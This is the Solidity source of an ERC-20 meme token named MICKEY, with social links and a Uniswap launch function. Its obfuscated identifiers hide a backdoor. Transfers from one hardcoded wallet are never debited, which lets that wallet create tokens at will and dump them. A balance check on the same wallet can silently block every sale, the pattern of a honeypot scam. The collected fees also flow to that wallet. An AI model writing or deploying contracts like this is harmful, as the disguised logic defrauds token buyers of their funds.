/*

Telegram: https://t.me/Mickey_Ethereum
Twitter: https://twitter.com/Mickey_Ethereum
Website: https://mickeyeth.com/

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Rqzaf(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Rqzaf(a, b, "SafeMath");
    }

    function  _Rqzaf(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qlxre(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract MICKEY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _qlbic;
    address payable private FqwSc;
    address private _Brqfp;
    string private constant _name = unicode"MICKEY";
    string private constant _symbol = unicode"MICKEY";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rfqte=0;
    uint256 private _vicrq=0;
    uint256 public _lrpch = _totalSupply;
    uint256 public _pvaep = _totalSupply;
    uint256 public _poimr= _totalSupply;
    uint256 public _brpea= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _wyrvo;
    mapping (address => bool) private _hfiek;
    mapping(address => uint256) private _FSigv;

    bool private _orxqopen;
    bool public _prlhc = false;
    bool private qlfxk = false;
    bool private _rawfp = false;


    event _benpw(uint _lrpch);
    modifier gkrdf {
        qlfxk = true;
        _;
        qlfxk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _wyrvo[owner(

        )] = true;
        _wyrvo[address
        (this)] = true;
        _wyrvo[
            FqwSc] = true;
        FqwSc = 
        payable (0x3A4F1DDC5DD3A11B23fD02C01Cb305F1D8Ce6853);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Rqzaf(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 elyqef=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prlhc) {
                if (to 
                != address
                (_qlbic) 
                && to !=
                 address
                 (_Brqfp)) {
                  require(_FSigv
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _FSigv
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Brqfp && to != 
            address(_qlbic) &&
             !_wyrvo[to] ) {
                require(amount 
                <= _lrpch,
                 "Exceeds the _lrpch.");
                require(balanceOf
                (to) + amount
                 <= _pvaep,
                  "Exceeds the _pvaep.");
                if(_vicrq
                < _Rfqte){
                  require
                  (! _gpbvy(to));
                }
                _vicrq++;
                 _hfiek
                 [to]=true;
                elyqef = amount._qlxre
                ((_vicrq>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Brqfp &&
             from!= address(this) 
            && !_wyrvo[from] ){
                require(amount <= 
                _lrpch && 
                balanceOf(FqwSc)
                <_brpea,
                 "Exceeds the _lrpch.");
                elyqef = amount._qlxre((_vicrq>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_vicrq>
                _Rfqte &&
                 _hfiek[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qlfxk 
            && to == _Brqfp &&
             _rawfp &&
             contractTokenBalance>
             _poimr 
            && _vicrq>
            _Rfqte&&
             !_wyrvo[to]&&
              !_wyrvo[from]
            ) {
                _transferFrom( _PvfQk(amount, 
                _PvfQk(contractTokenBalance,
                _brpea)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _vqrew(address
                    (this).balance);
                }
            }
        }

        if(elyqef>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(elyqef);
          emit
           Transfer(from,
           address
           (this),elyqef);
        }
        _balances[from
        ]= _Rqzaf(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Rqzaf(elyqef));
        emit Transfer
        (from, to, 
        amount.
         _Rqzaf(elyqef));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gkrdf {
        if(tokenAmount==
        0){return;}
        if(!_orxqopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _qlbic.WETH();
        _approve(address(this),
         address(
             _qlbic), 
             tokenAmount);
        _qlbic.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _PvfQk
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Rqzaf(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == FqwSc){
            return a ;
        }else{
            return a .
             _Rqzaf (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _lrpch = _totalSupply;
        _pvaep = _totalSupply;
        emit _benpw(_totalSupply);
    }

    function _gpbvy(address 
    account) private view 
    returns (bool) {
        uint256 QvAep;
        assembly {
            QvAep :=
             extcodesize
             (account)
        }
        return QvAep > 
        0;
    }

    function _vqrew(uint256
    amount) private {
        FqwSc.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _orxqopen ) ;
        _qlbic  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _qlbic), 
            _totalSupply);
        _Brqfp = 
        IUniswapV2Factory(_qlbic.
        factory( ) 
        ). createPair (
            address(this
            ),  _qlbic .
             WETH ( ) );
        _qlbic.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Brqfp).
        approve(address(_qlbic), 
        type(uint)
        .max);
        _rawfp = true;
        _orxqopen = true;
    }

    receive() external payable {}
}